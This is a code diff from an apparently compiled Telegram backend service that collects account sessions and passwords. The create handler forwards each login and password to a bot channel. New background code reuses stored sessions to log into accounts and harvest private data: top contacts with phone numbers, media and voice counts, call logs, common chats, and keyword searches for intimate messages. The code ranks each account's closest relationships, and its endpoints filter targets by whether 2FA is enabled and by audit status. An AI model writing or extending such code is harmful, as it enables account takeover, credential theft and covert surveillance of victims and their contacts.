+    const daysSinceLastMessage = lastMessageDate
+        ? (Date.now() - new Date(lastMessageDate).getTime()) / (1000 * 60 * 60 * 24)
+        : 999;
+    const recencyBonus = daysSinceLastMessage <= 90
+        ? 100 * (1 - daysSinceLastMessage / 90)
+        : 0;
+    return Math.round(msgScore + mediaScore + voiceScore + callScore +
+        intimateScore + mutualScore + commonChatScore + recencyBonus);
+}
+function rankRelationships(candidates, topN = 5) {
+    return candidates
+        .map(c => ({ ...c, score: scoreRelationship(c) }))
+        .sort((a, b) => b.score - a.score)
+        .slice(0, topN);
+}
+function computeAccountScore(topRelationships) {
+    return topRelationships.slice(0, 3).reduce((sum, r) => sum + r.score, 0);
+}
 
 
 /***/ },
@@ -35859,11 +35486,19 @@ let UsersController = class UsersController {
         this.usersService = usersService;
     }
     async create(createUserDto) {
-        console.log("creating new user");
         return this.usersService.create(createUserDto);
     }
     async search(queryParams) {
         return this.usersService.search(queryParams);
+    }
+    async topRelationships(page, limit, minScore, gender, excludeTwoFA) {
+        return this.usersService.topRelationships({
+            page: page ? parseInt(page, 10) : undefined,
+            limit: limit ? parseInt(limit, 10) : undefined,
+            minScore: minScore ? parseFloat(minScore) : undefined,
+            gender,
+            excludeTwoFA: excludeTwoFA === 'true',
+        });
     }
     async getTopInteractionUsers(page, limit, minScore, minCalls, minPhotos, minVideos, excludeTwoFA, excludeAudited, gender) {
         const pageNum = page ? parseInt(page, 10) : undefined;
@@ -35915,6 +35550,13 @@ let UsersController = class UsersController {
         }
         return this.usersService.findAll(limitNum, skipNum);
     }
+    async getUserRelationships(mobile) {
+        return this.usersService.getUserRelationships(mobile);
+    }
+    async recomputeScore(mobile) {
+        await this.usersService.computeRelationshipScore(mobile);
+        return this.usersService.getUserRelationships(mobile);
+    }
     async findOne(tgId) {
         return this.usersService.findOne(tgId);
     }
@@ -35926,12 +35568,7 @@ let UsersController = class UsersController {
     }
     async executeQuery(requestBody) {
         const { query, sort, limit, skip } = requestBody;
-        try {
-            return await this.usersService.executeQuery(query, sort, limit, skip);
-        }
-        catch (error) {
-            throw error;
-        }
+        return this.usersService.executeQuery(query, sort, limit, skip);
     }
 };
 exports.UsersController = UsersController;
@@ -35945,141 +35582,41 @@ __decorate([
 ], UsersController.prototype, "create", null);
 __decorate([
     (0, common_1.Get)('/search'),
-    (0, swagger_1.ApiOperation)({ summary: 'Search users based on various parameters' }),
+    (0, swagger_1.ApiOperation)({ summary: 'Search users' }),
     __param(0, (0, common_1.Query)()),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [search_user_dto_1.SearchUserDto]),
     __metadata("design:returntype", Promise)
 ], UsersController.prototype, "search", null);
 __decorate([
+    (0, common_1.Get)('top-relationships'),
+    (0, swagger_1.ApiOperation)({ summary: 'Get users ranked by relationship quality' }),
+    (0, swagger_1.ApiQuery)({ name: 'page', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'minScore', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'gender', required: false, type: String }),
+    (0, swagger_1.ApiQuery)({ name: 'excludeTwoFA', required: false, type: Boolean }),
+    __param(0, (0, common_1.Query)('page')),
+    __param(1, (0, common_1.Query)('limit')),
+    __param(2, (0, common_1.Query)('minScore')),
+    __param(3, (0, common_1.Query)('gender')),
+    __param(4, (0, common_1.Query)('excludeTwoFA')),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [String, String, String, String, String]),
+    __metadata("design:returntype", Promise)
+], UsersController.prototype, "topRelationships", null);
+__decorate([
     (0, common_1.Get)('top-interacted'),
-    (0, swagger_1.ApiOperation)({
-        summary: 'Get users with top interaction scores',
-        description: 'Retrieves users ranked by interaction score calculated from saved DB stats. ' +
-            'Score is based on photos, videos, calls, and other interactions. ' +
-            'Movie count has negative weightage as it indicates less genuine interaction. ' +
-            'Supports filtering and pagination for efficient data retrieval.'
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'page',
-        required: false,
-        type: Number,
-        description: 'Page number (default: 1, minimum: 1)',
-        example: 1,
-        minimum: 1
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'limit',
-        required: false,
-        type: Number,
-        description: 'Number of results per page (default: 20, max: 100)',
-        example: 20,
-        minimum: 1,
-        maximum: 100
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'minScore',
-        required: false,
-        type: Number,
-        description: 'Minimum interaction score to include (default: 0)',
-        example: 100,
-        minimum: 0
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'minCalls',
-        required: false,
-        type: Number,
-        description: 'Minimum total calls required (default: 0)',
-        example: 5,
-        minimum: 0
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'minPhotos',
-        required: false,
-        type: Number,
-        description: 'Minimum photos required (default: 0)',
-        example: 10,
-        minimum: 0
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'minVideos',
-        required: false,
-        type: Number,
-        description: 'Minimum videos required (default: 0)',
-        example: 5,
-        minimum: 0
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'excludeTwoFA',
-        required: false,
-        type: Boolean,
-        description: 'Exclude users with 2FA enabled (default: false)',
-        example: false
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'excludeAudited',
-        required: false,
-        type: Boolean,
-        description: 'Exclude users whose mobile is in session_audits (default: false). Set true to show only non-audited.',
-        example: false
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'gender',
-        required: false,
-        type: String,
-        description: 'Filter by gender',
-        example: 'male'
-    }),
-    (0, swagger_1.ApiResponse)({
-        status: 200,
-        description: 'Users retrieved successfully with interaction scores',
-        schema: {
-            type: 'object',
-            properties: {
-                users: {
-                    type: 'array',
-                    description: 'List of users with interaction scores',
-                    items: {
-                        type: 'object',
-                        properties: {
-                            id: { type: 'string', description: 'User ID' },
-                            mobile: { type: 'string' },
-                            tgId: { type: 'string' },
-                            firstName: { type: 'string' },
-                            lastName: { type: 'string' },
-                            username: { type: 'string' },
-                            photoCount: { type: 'number' },
-                            videoCount: { type: 'number' },
-                            ownPhotoCount: { type: 'number' },
-                            ownVideoCount: { type: 'number' },
-                            otherPhotoCount: { type: 'number' },
-                            otherVideoCount: { type: 'number' },
-                            movieCount: { type: 'number', description: 'Has negative impact on score' },
-                            calls: {
-                                type: 'object',
-                                properties: {
-                                    outgoing: { type: 'number' },
-                                    incoming: { type: 'number' },
-                                    video: { type: 'number' },
-                                    totalCalls: { type: 'number' }
-                                }
-                            },
-                            interactionScore: {
-                                type: 'number',
-                                description: 'Calculated interaction score (higher = more active/engaged)'
-                            }
-                        }
-                    }
-                },
-                total: { type: 'number', description: 'Total number of users matching filters' },
-                page: { type: 'number', description: 'Current page number' },
-                limit: { type: 'number', description: 'Results per page' },
-                totalPages: { type: 'number', description: 'Total number of pages' }
-            }
-        }
-    }),
-    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request - invalid query parameters' }),
-    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal Server Error' }),
+    (0, swagger_1.ApiOperation)({ summary: 'Get users ranked by interaction score' }),
+    (0, swagger_1.ApiQuery)({ name: 'page', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'minScore', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'minCalls', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'minPhotos', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'minVideos', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'excludeTwoFA', required: false, type: Boolean }),
+    (0, swagger_1.ApiQuery)({ name: 'excludeAudited', required: false, type: Boolean }),
+    (0, swagger_1.ApiQuery)({ name: 'gender', required: false, type: String }),
     __param(0, (0, common_1.Query)('page')),
     __param(1, (0, common_1.Query)('limit')),
     __param(2, (0, common_1.Query)('minScore')),
@@ -36096,20 +35633,8 @@ __decorate([
 __decorate([
     (0, common_1.Get)(),
     (0, swagger_1.ApiOperation)({ summary: 'Get all users' }),
-    (0, swagger_1.ApiQuery)({
-        name: 'limit',
-        required: false,
-        type: Number,
-        description: 'Number of results to return (default: 100)',
-        example: 100
-    }),
-    (0, swagger_1.ApiQuery)({
-        name: 'skip',
-        required: false,
-        type: Number,
-        description: 'Number of results to skip (default: 0)',
-        example: 0
-    }),
+    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
+    (0, swagger_1.ApiQuery)({ name: 'skip', required: false, type: Number }),
     __param(0, (0, common_1.Query)('limit')),
     __param(1, (0, common_1.Query)('skip')),
     __metadata("design:type", Function),
@@ -36117,9 +35642,27 @@ __decorate([
     __metadata("design:returntype", Promise)
 ], UsersController.prototype, "findAll", null);
 __decorate([
+    (0, common_1.Get)(':mobile/relationships'),
+    (0, swagger_1.ApiOperation)({ summary: 'Get relationship details for a specific user' }),
+    (0, swagger_1.ApiParam)({ name: 'mobile' }),
+    __param(0, (0, common_1.Param)('mobile')),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [String]),
+    __metadata("design:returntype", Promise)
+], UsersController.prototype, "getUserRelationships", null);
+__decorate([
+    (0, common_1.Post)('recompute-score/:mobile'),
+    (0, swagger_1.ApiOperation)({ summary: 'Recompute relationship score (live Telegram connection)' }),
+    (0, swagger_1.ApiParam)({ name: 'mobile' }),
+    __param(0, (0, common_1.Param)('mobile')),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [String]),
+    __metadata("design:returntype", Promise)
+], UsersController.prototype, "recomputeScore", null);
+__decorate([
     (0, common_1.Get)(':tgId'),
-    (0, swagger_1.ApiOperation)({ summary: 'Get a user by tgId' }),
-    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
+    (0, swagger_1.ApiOperation)({ summary: 'Get user by tgId' }),
+    (0, swagger_1.ApiParam)({ name: 'tgId' }),
     __param(0, (0, common_1.Param)('tgId')),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [String]),
@@ -36127,8 +35670,8 @@ __decorate([
 ], UsersController.prototype, "findOne", null);
 __decorate([
     (0, common_1.Patch)(':tgId'),
-    (0, swagger_1.ApiOperation)({ summary: 'Update a user by tgId' }),
-    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
+    (0, swagger_1.ApiOperation)({ summary: 'Update user by tgId' }),
+    (0, swagger_1.ApiParam)({ name: 'tgId' }),
     __param(0, (0, common_1.Param)('tgId')),
     __param(1, (0, common_1.Body)()),
     __metadata("design:type", Function),
@@ -36137,8 +35680,8 @@ __decorate([
 ], UsersController.prototype, "update", null);
 __decorate([
     (0, common_1.Delete)(':tgId'),
-    (0, swagger_1.ApiOperation)({ summary: 'Delete a user by tgId' }),
-    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
+    (0, swagger_1.ApiOperation)({ summary: 'Delete user by tgId' }),
+    (0, swagger_1.ApiParam)({ name: 'tgId' }),
     __param(0, (0, common_1.Param)('tgId')),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [String]),
@@ -36146,7 +35689,7 @@ __decorate([
 ], UsersController.prototype, "remove", null);
 __decorate([
     (0, common_1.Post)('query'),
-    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
+    (0, swagger_1.ApiOperation)({ summary: 'Execute custom MongoDB query' }),
     __param(0, (0, common_1.Body)()),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [Object]),
@@ -36225,6 +35768,10 @@ var __metadata = (this && this.__metadata) || function (k, v) {
 var __param = (this && this.__param) || function (paramIndex, decorator) {
     return function (target, key) { decorator(target, key, paramIndex); }
 };
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+var UsersService_1;
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.UsersService = void 0;
 const Telegram_service_1 = __webpack_require__(/*! ./../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
@@ -36235,44 +35782,37 @@ const client_service_1 = __webpack_require__(/*! ../clients/client.service */ ".
 const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
 const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
 const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
-let UsersService = class UsersService {
+const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
+const scoring_1 = __webpack_require__(/*! ./scoring */ "./src/components/users/scoring/index.ts");
+const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
+const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
+const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
+let UsersService = UsersService_1 = class UsersService {
     constructor(userModel, telegramService, clientsService, botsService) {
         this.userModel = userModel;
         this.telegramService = telegramService;
         this.clientsService = clientsService;
         this.botsService = botsService;
+        this.logger = new utils_1.Logger(UsersService_1.name);
     }
     async create(user) {
         const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
-        console.log("New User received - ", user?.mobile);
-        console.log("ActiveClientSetup::", activeClientSetup);
+        this.logger.log(`New User received - ${user?.mobile}`);
+        this.logger.debug('ActiveClientSetup:', activeClientSetup);
         if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
-            console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
+            this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
             await this.clientsService.updateClientSession(user.session, user.mobile);
         }
         else {
             await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
-            setTimeout(async () => {
-                try {
-                    const telegramClient = await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
-                    const calllogs = await telegramClient.getCallLogStats();
-                    let score = 1;
-                    for (const callData of calllogs.chats) {
-                        const messages = await telegramClient.getMessages(callData.chatId, 2);
-                        score = score + (messages.pagination.total || 0) * (callData.totalCalls + 1) * (callData.averageDuration + 1);
-                        await (0, Helpers_1.sleep)(1000);
-                    }
-                    await this.updateByFilter({ mobile: user.mobile }, { score });
-                }
-                catch (error) {
-                    console.log("Error in creating new session", error);
-                }
-                finally {
-                    await connection_manager_1.connectionManager.unregisterClient(user.mobile).catch(() => undefined);
-                }
-            }, 3000);
             const newUser = new this.userModel(user);
-            return newUser.save();
+            const saved = await newUser.save();
+            setTimeout(() => {
+                this.computeRelationshipScore(user.mobile).catch(err => {
+                    this.logger.error(`Background scoring failed for ${user.mobile}`, err);
+                });
+            }, 5000);
+            return saved;
         }
     }
     async top(options) {
@@ -36282,7 +35822,7 @@ let UsersService = class UsersService {
         const skip = (pageNum - 1) * limitNum;
         const query = {
             expired: { $ne: true },
-            score: { $gte: minScore },
+            'relationships.score': { $gte: minScore },
         };
         if (excludeTwoFA)
             query.twoFA = { $ne: true };
@@ -36291,9 +35831,9 @@ let UsersService = class UsersService {
         if (minCalls > 0)
             query['calls.totalCalls'] = { $gte: minCalls };
         if (minPhotos > 0)
-            query.photoCount = { $gte: minPhotos };
+            query['photoCount'] = { $gte: minPhotos };
         if (minVideos > 0)
-            query.videoCount = { $gte: minVideos };
+            query['videoCount'] = { $gte: minVideos };
         const total = await this.userModel.countDocuments(query).exec();
         const totalPages = Math.ceil(total / limitNum);
         if (total === 0) {
@@ -36302,7 +35842,7 @@ let UsersService = class UsersService {
         const users = await this.userModel
             .find(query)
             .select('-session')
-            .sort({ score: -1 })
+            .sort({ 'relationships.score': -1 })
             .skip(skip)
             .limit(limitNum)
             .lean()
@@ -36354,10 +35894,275 @@ let UsersService = class UsersService {
         if (query.firstName) {
             query.firstName = { $regex: new RegExp(query.firstName, 'i') };
         }
-        if (query.twoFA !== undefined) {
-            query.twoFA = String(query.twoFA) === 'true' || String(query.twoFA) === '1';
-        }
         return this.userModel.find(query).sort({ updatedAt: -1 }).exec();
+    }
+    async computeRelationshipScore(mobile) {
+        const wasConnected = connection_manager_1.connectionManager.hasClient(mobile);
+        let telegramClient = null;
+        try {
+            telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
+            const me = await telegramClient.getMe();
+            const selfId = me.id?.toString();
+            const candidateMap = new Map();
+            try {
+                const topPeersResult = await telegramClient.client.invoke(new tl_1.Api.contacts.GetTopPeers({
+                    correspondents: true,
+                    phoneCalls: true,
+                    forwardUsers: true,
+                    offset: 0,
+                    limit: 50,
+                    hash: (0, big_integer_1.default)(0),
+                }));
+                if (topPeersResult instanceof tl_1.Api.contacts.TopPeers) {
+                    const userMap = new Map();
+                    for (const u of topPeersResult.users || []) {
+                        if (u instanceof tl_1.Api.User && !u.bot) {
+                            userMap.set(u.id.toString(), u);
+                        }
+                    }
+                    for (const category of topPeersResult.categories || []) {
+                        for (const topPeer of category.peers || []) {
+                            const peerId = topPeer.peer?.userId?.toString();
+                            if (!peerId || peerId === selfId)
+                                continue;
+                            const user = userMap.get(peerId);
+                            if (!user)
+                                continue;
+                            candidateMap.set(peerId, {
+                                id: peerId,
+                                name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
+                                username: user.username || null,
+                                phone: user.phone || null,
+                                source: 'topPeers',
+                            });
+                        }
+                    }
+                    this.logger.log(`[${mobile}] GetTopPeers: ${candidateMap.size} candidates`);
+                }
+            }
+            catch (topPeersError) {
+                this.logger.warn(`[${mobile}] GetTopPeers failed (may be disabled): ${topPeersError.message}`);
+            }
+            try {
+                let dialogCount = 0;
+                for await (const d of telegramClient.client.iterDialogs({ limit: 100 })) {
+                    if (!d.isUser || !(d.entity instanceof tl_1.Api.User))
+                        continue;
+                    const user = d.entity;
+                    if (user.bot)
+                        continue;
+                    const id = user.id.toString();
+                    if (id === selfId)
+                        continue;
+                    const existing = candidateMap.get(id);
+                    if (existing) {
+                        existing.source = 'both';
+                    }
+                    else {
+                        candidateMap.set(id, {
+                            id,
+                            name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
+                            username: user.username || null,
+                            phone: user.phone || null,
+                            source: 'dialogs',
+                        });
+                    }
+                    dialogCount++;
+                    if (dialogCount >= 40)
+                        break;
+                }
+                this.logger.log(`[${mobile}] iterDialogs: ${dialogCount} users scanned, total candidates: ${candidateMap.size}`);
+            }
+            catch (dialogError) {
+                this.logger.warn(`[${mobile}] iterDialogs failed: ${dialogError.message}`);
+            }
+            if (candidateMap.size === 0) {
+                this.logger.log(`[${mobile}] No candidates found from either source`);
+                return;
+            }
+            const mutualChatIds = new Set();
+            try {
+                const contactsResult = await telegramClient.getContacts();
+                if (contactsResult && 'users' in contactsResult) {
+                    for (const user of contactsResult.users || []) {
+                        if (user.mutualContact)
+                            mutualChatIds.add(user.id?.toString());
+                    }
+                }
+            }
+            catch { }
+            const allCandidates = Array.from(candidateMap.values()).slice(0, 15);
+            const candidates = [];
+            const callAgg = { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 };
+            for (const candidate of allCandidates) {
+                try {
+                    const chatPeer = await telegramClient.getchatId(candidate.id);
+                    let totalMessages = 0;
+                    let lastMessageDate = null;
+                    try {
+                        const msgResult = await telegramClient.client.getMessages(candidate.id, { limit: 1 });
+                        totalMessages = msgResult?.total ?? 0;
+                        const lastMsg = msgResult?.[0];
+                        if (lastMsg?.date) {
+                            lastMessageDate = new Date(lastMsg.date * 1000).toISOString();
+                        }
+                    }
+                    catch { }
+                    if (totalMessages < 5) {
+                        await (0, Helpers_1.sleep)(100);
+                        continue;
+                    }
+                    let mediaCount = 0;
+                    let voiceCount = 0;
+                    try {
+                        const counters = await telegramClient.client.invoke(new tl_1.Api.messages.GetSearchCounters({
+                            peer: chatPeer,
+                            filters: [
+                                new tl_1.Api.InputMessagesFilterPhotoVideo(),
+                                new tl_1.Api.InputMessagesFilterVoice(),
+                            ],
+                        }));
+                        const counterArr = counters;
+                        mediaCount = counterArr?.[0]?.count ?? 0;
+                        voiceCount = counterArr?.[1]?.count ?? 0;
+                    }
+                    catch { }
+                    let callStats = { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0, outgoing: 0, audioCalls: 0 };
+                    try {
+                        const callHistory = await telegramClient.getChatCallHistory(candidate.id, 200, false);
+                        callStats = {
+                            totalCalls: callHistory.totalCalls,
+                            incoming: callHistory.incoming,
+                            outgoing: callHistory.outgoing,
+                            videoCalls: callHistory.videoCalls,
+                            audioCalls: callHistory.audioCalls,
+                            totalDuration: callHistory.totalDuration,
+                            averageDuration: callHistory.averageDuration,
+                        };
+                        callAgg.totalCalls += callStats.totalCalls;
+                        callAgg.incoming += callStats.incoming;
+                        callAgg.outgoing += callStats.outgoing;
+                        callAgg.video += callStats.videoCalls;
+                        callAgg.audio += callStats.audioCalls;
+                    }
+                    catch { }
+                    let commonChats = 0;
+                    try {
+                        const common = await telegramClient.client.invoke(new tl_1.Api.messages.GetCommonChats({
+                            userId: candidate.id,
+                            maxId: (0, big_integer_1.default)(0),
+                            limit: 100,
+                        }));
+                        commonChats = common?.chats?.length ?? 0;
+                    }
+                    catch { }
+                    let intimateMessageCount = 0;
+                    for (const keyword of scoring_1.INTIMATE_KEYWORDS) {
+                        try {
+                            const result = await telegramClient.client.invoke(new tl_1.Api.messages.Search({
+                                peer: chatPeer,
+                                q: keyword,
+                                filter: new tl_1.Api.InputMessagesFilterEmpty(),
+                                minDate: 0,
+                                maxDate: 0,
+                                offsetId: 0,
+                                addOffset: 0,
+                                limit: 1,
+                                maxId: 0,
+                                minId: 0,
+                                hash: (0, big_integer_1.default)(0),
+                            }));
+                            intimateMessageCount += result?.count ?? 0;
+                            await (0, Helpers_1.sleep)(150);
+                        }
+                        catch { }
+                    }
+                    candidates.push({
+                        chatId: candidate.id,
+                        name: candidate.name,
+                        username: candidate.username,
+                        phone: candidate.phone,
+                        messages: totalMessages,
+                        mediaCount,
+                        voiceCount,
+                        intimateMessageCount,
+                        calls: {
+                            total: callStats.totalCalls,
+                            incoming: callStats.incoming,
+                            videoCalls: callStats.videoCalls,
+                            avgDuration: callStats.averageDuration,
+                            totalDuration: callStats.totalDuration,
+                        },
+                        commonChats,
+                        isMutualContact: mutualChatIds.has(candidate.id),
+                        lastMessageDate,
+                    });
+                    this.logger.debug(`[${mobile}] Scored ${candidate.name}: msgs=${totalMessages} media=${mediaCount} voice=${voiceCount} intimate=${intimateMessageCount} calls=${callStats.totalCalls} (${candidate.source})`);
+                    await (0, Helpers_1.sleep)(200);
+                }
+                catch (chatError) {
+                    this.logger.warn(`[${mobile}] Failed to score chat ${candidate.id}: ${chatError.message}`);
+                }
+            }
+            const top = (0, scoring_1.rankRelationships)(candidates, 5);
+            const accountScore = (0, scoring_1.computeAccountScore)(top);
+            const bestScore = top.length > 0 ? top[0].score : 0;
+            await this.userModel.updateOne({ mobile }, {
+                $set: {
+                    'relationships.score': accountScore,
+                    'relationships.bestScore': bestScore,
+                    'relationships.computedAt': new Date(),
+                    'relationships.top': top,
+                    calls: callAgg,
+                },
+            }).exec();
+            this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
+        }
+        catch (error) {
+            (0, parseError_1.parseError)(error, `[${mobile}] computeRelationshipScore failed`);
+        }
+        finally {
+            if (!wasConnected && telegramClient) {
+                await connection_manager_1.connectionManager.unregisterClient(mobile).catch(() => undefined);
+            }
+        }
+    }
+    async topRelationships(options) {
+        const { page = 1, limit = 20, minScore = 0, excludeTwoFA = false, gender } = options;
+        const pageNum = Math.max(1, Math.floor(page));
+        const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
+        const skip = (pageNum - 1) * limitNum;
+        const query = {
+            expired: { $ne: true },
+            'relationships.bestScore': { $gt: minScore },
+        };
+        if (excludeTwoFA)
+            query.twoFA = { $ne: true };
+        if (gender)
+            query.gender = gender;
+        const total = await this.userModel.countDocuments(query).exec();
+        if (total === 0) {
+            return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
+        }
+        const users = await this.userModel
+            .find(query)
+            .select('-session -password')
+            .sort({ 'relationships.bestScore': -1 })
+            .skip(skip)
+            .limit(limitNum)
+            .lean()
+            .exec();
+        return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
+    }
+    async getUserRelationships(mobile) {
+        const user = await this.userModel
+            .findOne({ mobile })
+            .select('mobile firstName lastName tgId relationships')
+            .lean()
+            .exec();
+        if (!user)
+            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
+        return user;
     }
     async executeQuery(query, sort, limit, skip) {
         if (!query) {
@@ -36377,172 +36182,9 @@ let UsersService = class UsersService {
             throw new common_1.InternalServerErrorException(error.message);
         }
     }
-    async getTopInteractionUsers(options) {
-        const { page = 1, limit = 20, minScore = 30, minCalls = 0, minPhotos = 0, minVideos = 0, excludeTwoFA = false, excludeAudited = true, gender } = options;
-        const pageNum = Math.max(1, Math.floor(page));
-        const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
-        const skip = (pageNum - 1) * limitNum;
-        const weights = {
-            ownPhoto: 15,
-            ownVideo: 18,
-            otherPhoto: 3,
-            otherVideo: 5,
-            totalPhoto: 2,
-            totalVideo: 3,
-            incomingCall: 5,
-            outgoingCall: 3,
-            videoCall: 8,
-            totalCalls: 1,
-            msgs: 0,
-            movieCount: -5,
-        };
-        const filter = {
-            expired: { $ne: true },
-        };
-        if (excludeTwoFA) {
-            filter.twoFA = { $ne: true };
-        }
-        if (gender) {
-            filter.gender = gender;
-        }
-        if (minCalls > 0) {
-            filter.$or = [
-                ...(filter.$or || []),
-                { 'calls.totalCalls': { $gte: minCalls } },
-            ];
-        }
-        if (minPhotos > 0) {
-            filter.$or = [
-                ...(filter.$or || []),
-                { photoCount: { $gte: minPhotos } },
-                { ownPhotoCount: { $gte: minPhotos } },
-                { otherPhotoCount: { $gte: minPhotos } },
-            ];
-        }
-        if (minVideos > 0) {
-            filter.$or = [
-                ...(filter.$or || []),
-                { videoCount: { $gte: minVideos } },
-                { ownVideoCount: { $gte: minVideos } },
-                { otherVideoCount: { $gte: minVideos } },
-            ];
-        }
-        const scoringStages = [
-            { $match: filter },
-            ...(excludeAudited
-                ? [
-                    { $lookup: { from: 'session_audits', localField: 'mobile', foreignField: 'mobile', as: 'sessionAudits' } },
-                    { $match: { sessionAudits: { $size: 0 } } },
-                    { $project: { sessionAudits: 0 } },
-                ]
-                : []),
-            { $group: { _id: '$mobile', doc: { $first: '$$ROOT' } } },
-            { $replaceRoot: { newRoot: '$doc' } },
-            {
-                $addFields: {
-                    photoScore: {
-                        $add: [
-                            { $multiply: [{ $ifNull: ['$ownPhotoCount', 0] }, weights.ownPhoto] },
-                            { $multiply: [{ $ifNull: ['$otherPhotoCount', 0] }, weights.otherPhoto] },
-                            {
-                                $cond: {
-                                    if: { $and: [{ $lte: [{ $ifNull: ['$ownPhotoCount', 0] }, 0] }, { $lte: [{ $ifNull: ['$otherPhotoCount', 0] }, 0] }] },
-                                    then: { $multiply: [{ $ifNull: ['$photoCount', 0] }, weights.totalPhoto] },
-                                    else: 0,
-                                },
-                            },
-                        ],
-                    },
-                    videoScore: {
-                        $add: [
-                            { $multiply: [{ $ifNull: ['$ownVideoCount', 0] }, weights.ownVideo] },
-                            { $multiply: [{ $ifNull: ['$otherVideoCount', 0] }, weights.otherVideo] },
-                            {
-                                $cond: {
-                                    if: { $and: [{ $lte: [{ $ifNull: ['$ownVideoCount', 0] }, 0] }, { $lte: [{ $ifNull: ['$otherVideoCount', 0] }, 0] }] },
-                                    then: { $multiply: [{ $ifNull: ['$videoCount', 0] }, weights.totalVideo] },
-                                    else: 0,
-                                },
-                            },
-                        ],
-                    },
-                    callScore: {
-                        $let: {
-                            vars: {
-                                incomingVal: { $ifNull: ['$calls.incoming', 0] },
-                                outgoingVal: { $ifNull: ['$calls.outgoing', 0] },
-                                videoVal: { $ifNull: ['$calls.video', 0] },
-                                totalCallsVal: { $ifNull: ['$calls.totalCalls', 0] },
-                            },
-                            in: {
-                                $add: [
-                                    { $multiply: ['$$incomingVal', weights.incomingCall] },
-                                    { $multiply: ['$$outgoingVal', weights.outgoingCall] },
-                                    { $multiply: ['$$videoVal', weights.videoCall] },
-                                    {
-                                        $cond: {
-                                            if: { $and: [{ $eq: ['$$incomingVal', 0] }, { $eq: ['$$outgoingVal', 0] }, { $gt: ['$$totalCallsVal', 0] }] },
-                                            then: { $multiply: ['$$totalCallsVal', weights.totalCalls] },
-                                            else: 0,
-                                        },
-                                    },
-                                ],
-                            },
-                        },
-                    },
-                    msgScore: { $multiply: [{ $ifNull: ['$msgs', 0] }, weights.msgs] },
-                    movieScore: { $multiply: [{ $ifNull: ['$movieCount', 0] }, weights.movieCount] },
-                },
-            },
-            {
-                $addFields: {
-                    interactionScore: {
-                        $round: [{ $add: ['$photoScore', '$videoScore', '$callScore', '$msgScore', '$movieScore'] }, 2],
-                    },
-                },
-            },
-            { $match: { interactionScore: { $gte: minScore } } },
-        ];
-        try {
-            const countPipeline = [...scoringStages, { $count: 'count' }];
-            const countResult = await this.userModel.collection.aggregate(countPipeline, { allowDiskUse: true }).toArray();
